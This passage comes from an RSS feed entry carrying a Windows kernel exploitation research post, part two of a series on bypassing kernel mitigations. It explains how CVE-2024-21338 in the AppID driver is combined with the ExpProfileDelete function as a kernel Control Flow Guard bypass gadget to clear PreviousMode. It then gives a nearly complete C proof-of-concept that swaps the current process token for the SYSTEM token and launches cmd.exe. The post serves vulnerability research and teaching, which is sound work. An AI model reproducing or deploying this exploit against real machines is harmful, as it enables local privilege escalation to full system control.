(PVOID)restoreBuffer, <span class="hljs-keyword">sizeof</span>(CHAR), &amp;dwbytes);system(<span class="hljs-string">&quot;cmd.exe&quot;</span>);</code></pre><p>If we add the code above and try again&#x2026;</p><p><img src="/2025/01/12/l0ch/bypassing-kernel-mitigation-part2/en/image%2010.png" alt="image.png"></p><p>We can modify the PreviousMode to achieve elevated privileges.</p><p>Coming back to the kCFG bypass, we can modify the PreviousMode by calling a normal kernel function registered in the kCFG bitmap after triggering the untrusted pointer dereference vulnerability of CVE-2024-21338. But&#x2026; how do we find this function among the many, many kernel functions :(</p><p>One function worth noting is the <code>ObfDereferenceObjectWithTag</code> kernel macro. This macro decrements the reference count field of the object address being passed (offset -0x30), so it would be a perfect macro to change PreviousMode from a user-mode value of 1 to a kernel-mode value of 0.</p><p>However, there is one limitation to calling <code>ObfDereferenceObjectWithTag</code> directly. As we saw earlier in the bug trigger, we can&#x2019;t directly control the value of the first argument, but only indirectly control the value.</p><p><img src="/2025/01/12/l0ch/bypassing-kernel-mitigation-part2/en/image%203.png" alt="image.png"></p><p>We need to find another wrapper function that allows us to dereference rcx once and pass the value as an argument to the <code>ObfDereferenceObjectWithTag</code> macro so that we can control it directly.</p><p>If we look far enough down the cross-reference list of the <code>ObfDereferenceObjectWithTag</code> macro, we find the <code>ExpProfileDelete</code> function that satisfies that condition.</p><pre><code class="hljs lua">void __fastcall ExpProfileDelete(__int64 a1){  <span class="hljs-keyword">if</span> ( *(_QWORD *)(a1 + <span class="hljs-number">48</span>) )  {    KeStopProfile(*(_QWORD *)(a1 + <span class="hljs-number">40</span>));    MmUnmapLockedPages(*(PVOID *)(a1 + <span class="hljs-number">48</span>), *(PMDL *)(a1 + <span class="hljs-number">56</span>));    MmUnlockPages(*(PMDL *)(a1 + <span class="hljs-number">56</span>));    ExFreePoolWithTag(*(PVOID *)(a1 + <span class="hljs-number">40</span>), <span class="hljs-number">0</span>);  }  <span class="hljs-keyword">if</span> ( *(_QWORD *)a1 )    ObfDereferenceObjectWithTag(*(PVOID *)a1, <span class="hljs-number">0x66507845</span>u);}</code></pre><p>We call it by passing the value referencing the first argument to <code>ObfDereferenceObjectWithTag</code>, which gives us direct control over the first argument of the macro. </p><p><img src="/2025/01/12/l0ch/bypassing-kernel-mitigation-part2/en/image%2011.png" alt="image.png"></p><p>First of all, when calling the <code>ExpProfileDelete</code> function via CVE-2024-21338 vulnerability, kCFG is bypassed and jumps to the <code>ExpProfileDelete</code> address.</p><blockquote><p>The <code>ExpProfileDelete</code> function address can be obtained by calculating the offset from the ntoskrnle.exe base obtained via <code>NtQuerySystemInformation</code> in Part 1.</p></blockquote><p><img src="/2025/01/12/l0ch/bypassing-kernel-mitigation-part2/en/image%2012.png" alt="image.png"></p><p>Inside <code>ExpProfileDelete</code>, the rcx at the time of the <code>ObfDereferenceObjectWithTag</code> macro call comes out as <code>0x414141414141414141</code>. We can finally decrement the address we want!</p><p>There may be more functions that satisfy our conditions, even if they are not <code>ExpProfileDelete</code>. However, the more complex the logic of the function, the more likely it is to crash and execute code other than our intended behavior, so it&#x2019;s probably a good idea to find a relatively simple function to target.</p><p>Below is the final proof-of-concept code that modifies PreviousMode and performs Token Swapping with CVE-2024-21338 vulnerability</p><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;defines.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> STATUS_INFO_LENGTH_MISMATCH 0xc0000004</span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> DEVICE_NAME <span class="hljs-meta-string">&quot;\\\\?\\AppID&quot;</span></span><span class="hljs-comment">// IOCTL 0x22A018</span><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> {</span>PVOID arg1;PVOID objptr;PVOID cfgptr;PVOID unknown;} INPUT_BUFFER;_NtQuerySystemInformation pNtQuerySystemInformation;_NtFsControlFile pNtFsControlFile;_NtWriteVirtualMemory pNtWriteVirtualMemory;_NtReadVirtualMemory pNtReadVIrtualMemory;_NtDeviceIoControlFile pNtDeviceIoControlFile;<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">GetNtFunction</span><span class="hljs-params">()</span> </span>{...}<span class="hljs-function">PVOID <span class="hljs-title">GetImageBase</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>* ModuleName)</span> </span>{...}<span class="hljs-function">PVOID <span class="hljs-title">GetFILE_OBJECT_Address</span><span class="hljs-params">()</span></span>{...}<span class="hljs-function">PVOID <span class="hljs-title">GetObj</span><span class="hljs-params">(PULONGLONG objptr, ULONG pid, HANDLE handle)</span></span>{...}<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>{PVOID KTHREAD = <span class="hljs-literal">NULL</span>;PVOID SYSTEM_EPROCESS = <span class="hljs-literal">NULL</span>;PVOID EPROCESS = <span class="hljs-literal">NULL</span>;PVOID PreviousMode = <span class="hljs-literal">NULL</span>;PVOID NTOSKRNL_BASE = <span class="hljs-literal">NULL</span>;ULONG dwbytes = <span class="hljs-number">0</span>;GetNtFunction();DWORD pid = GetCurrentProcessId();HANDLE hThread = OpenThread(THREAD_QUERY_INFORMATION, TRUE, GetCurrentThreadId());GetObj(&amp;KTHREAD, pid, hThread);<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] Current KTHREAD: %p\n&quot;</span>, KTHREAD);PreviousMode = (UINT64)KTHREAD + <span class="hljs-number">0x232</span>;<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] PreviousMode address: %p\n&quot;</span>, PreviousMode);HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION, TRUE, pid);GetObj(&amp;EPROCESS, pid, hProc);<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] Current EPROCESS: %p\n&quot;</span>, EPROCESS);GetObj(&amp;SYSTEM_EPROCESS, <span class="hljs-number">4</span>, (HANDLE)<span class="hljs-number">4</span>);<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] System EPROCESS: %p\n&quot;</span>, SYSTEM_EPROCESS);NTOSKRNL_BASE = GetImageBase(<span class="hljs-string">&quot;ntoskrnl.exe&quot;</span>);<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] ntoskrnl.exe base address : %p\n&quot;</span>, NTOSKRNL_BASE);PVOID ExpProfileDelete = (UINT64)NTOSKRNL_BASE + <span class="hljs-number">0xA01FD0</span>; <span class="hljs-comment">// kcfg bypass gadget</span><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] ExpProfileDelete function address : %p\n&quot;</span>, ExpProfileDelete);PVOID FILE_OBJECT = GetFILE_OBJECT_Address();INPUT_BUFFER buffer = { <span class="hljs-number">0</span>, };HANDLE dHandle;dHandle = CreateFileA(DEVICE_NAME, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, <span class="hljs-literal">NULL</span>, CREATE_NEW, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);buffer.arg1 = (UINT64)PreviousMode + <span class="hljs-number">0x30</span>;buffer.objptr = FILE_OBJECT;buffer.cfgptr = &amp;ExpProfileDelete;buffer.unknown = <span class="hljs-literal">NULL</span>;IO_STATUS_BLOCK ioStatus;<span class="hljs-keyword">if</span> (pNtDeviceIoControlFile(dHandle, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, &amp;ioStatus, <span class="hljs-number">0x22A018</span>, &amp;buffer, <span class="hljs-keyword">sizeof</span>(buffer), <span class="hljs-literal">NULL</span>, &amp;dwbytes) != NOERROR) {<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;NtDeviceIoControlFile Failed, 0x%x\n&quot;</span>, GetLastError());}pNtWriteVirtualMemory(GetCurrentProcess(), (ULONGLONG)EPROCESS + <span class="hljs-number">0x4b8</span>, (ULONGLONG)SYSTEM_EPROCESS + <span class="hljs-number">0x4b8</span>, <span class="hljs-keyword">sizeof</span>(ULONGLONG), &amp;dwbytes);<span class="hljs-keyword">char</span>* restoreBuffer = (<span class="hljs-keyword">char</span>*)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(CHAR));*restoreBuffer = <span class="hljs-number">1</span>;pNtWriteVirtualMemory(GetCurrentProcess(), (ULONGLONG)KTHREAD + <span class="hljs-number">0x232</span>, (PVOID)restoreBuffer, <span class="hljs-keyword">sizeof</span>(CHAR), &amp;dwbytes);system(<span class="hljs-string">&quot;cmd.exe&quot;</span>);<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;}</code></pre><blockquote><p><a href="https://github.com/hackyboiz/kcfg-bypass/blob/main/CVE-2024-21338.c">https://github.com/hackyboiz/kcfg-bypass/blob/main/CVE-2024-21338.c</a></p></blockquote><p><img src="/2025/01/12/l0ch/bypassing-kernel-mitigation-part2/en/image%2013.png" alt="image.png"></p><p>I originally planned to introduce all three techniques in this part. It ended up being longer than I thought, so I&#x2019;ll summarize the remaining two techniques in the next part&#x2026; (it&#x2019;s okay, I&#x2019;m off for the holidays)</p><p>I&#x2019;ll be back with Part 3 :) Keep up the good work in 2025!</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/kernel/">kernel</category>
      
      <category domain="https://hackyboiz.github.io/tags/windows/">windows</category>
      
      <category domain="https://hackyboiz.github.io/tags/bypass/">bypass</category>
      
      <category domain="https://hackyboiz.github.io/tags/L0ch/">L0ch</category>
      
      <category domain="https://hackyboiz.github.io/tags/mitigation/">mitigation</category>
      
      <category domain="https://hackyboiz.github.io/tags/smep/">smep</category>
      
      <category domain="https://hackyboiz.github.io/tags/kcfg/">kcfg</category>
      
      <category domain="https://hackyboiz.github.io/tags/dep/">dep</category>
      
      <category domain="https://hackyboiz.github.io/tags/exploit-techniques/">exploit techniques</category>
      
      <category domain="https://hackyboiz.github.io/tags/previousmode/">previousmode</category>
      
      <category domain="https://hackyboiz.github.io/tags/cve-2024-21338/">cve-2024-21338</category>
      
      <category domain="https://hackyboiz.github.io/tags/sedebugprivilege/">sedebugprivilege</category>
      
      <category domain="https://hackyboiz.github.io/tags/ioring/">ioring</category>
      
      
      <comments>https://hackyboiz.github.io/2025/01/12/l0ch/bypassing-kernel-mitigation-part2/en/#disqus_thread</comments>
      
    </item>
    
  </channel>
</rss>
